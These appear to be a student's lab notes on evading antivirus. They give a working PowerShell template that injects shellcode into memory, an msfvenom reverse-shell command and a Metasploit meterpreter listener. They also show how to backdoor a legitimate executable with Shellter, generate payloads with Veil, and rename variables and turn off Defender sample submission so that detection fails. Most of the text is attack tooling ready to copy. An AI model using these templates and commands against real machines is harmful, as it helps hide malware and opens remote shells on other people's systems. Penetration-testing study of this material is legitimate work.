
#### Testing for AV evasion

We need to use AntiScan.Me to scan our own malware/payloads to prevent submissions to AV vendors like VirusTotal does.

We must also ensure Automatic Sample submission is disabled within out windows defender while developing and testing our malware to prevent the cloud engine learning about and creating heuristics for said malware. Only once we are sure the AV evasion is affective for our malware can we turn on automatic sampling again.


#### Evading with Thread Injection

Antivirus  typically enforce threat quarantine by blocking any file system operation at the kernel level or story malicious samples in encrypted storage only accessible to AV software.

We may be able to bypass antivirus with PowerShell. Powershell can interact with the windows API. We can use this to implement an in-memory injection process in a powershell script. 

The benefits of using a script like this rathe than a PE is its difficult for AV  to determine if a script is malicious as its run inside an interpreter and the script itself isn't executable code. Some AV handle this better than others.

If a script like this is marked a malicious it can be easily changed. AV checks for variable names, comments and logic - which can be easily altered. If you run the script through a scanner and its detected, change obvious variables names where possible and change structure if possible, and any language that could be seen as nefarious.

Basic memory injection template:

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

payload used:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```

*be careful and launch the correct architecture for powershell - x86

to bypass execution policy error we can attempt to get information about execution policy for the user and change it:

`Get-ExecutionPolicy -Scope CurrentUser` - check the scope of policy
`Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scopr CurrentUser` - set the execution policy to unrestricted to enable execution rights
`repeat step 1 to confirm successful change`

#### Automating the Process

##### Shellter

We can make use of Shellter to bypass AV. It works by using techniques to backdoor a valid and non-malicious executable file with a shellcode payload.

necessary installations:

`sudo apt install shellter`
`sudo apt install wine`
`dpkg --add-architecture i386 && apt-get update && apt-get install wine32`

Allows manual or auto mode - manual gives are more granular control over the PE execution and injection path when auto fails.

`when selecting a PE to inject malicious payload - it is best practice to pick a new, less scrutinized application`

stealth mode enables execution flow of the PE to return to normal after our shell code is executed.

`msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"`


##### Veil

Veil is a tool designed to generate Metasploit payloads that bypass common anti-virus solutions.

Veil is useful for utilizing ps1 scripts as payloads - ps1 scripts will open using notepad when double clicked (not executed) so veil will translate the ps1 script into a .bat file which can be used to gain a shell (this is generated using veil).

```
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```

run veil and generate payload.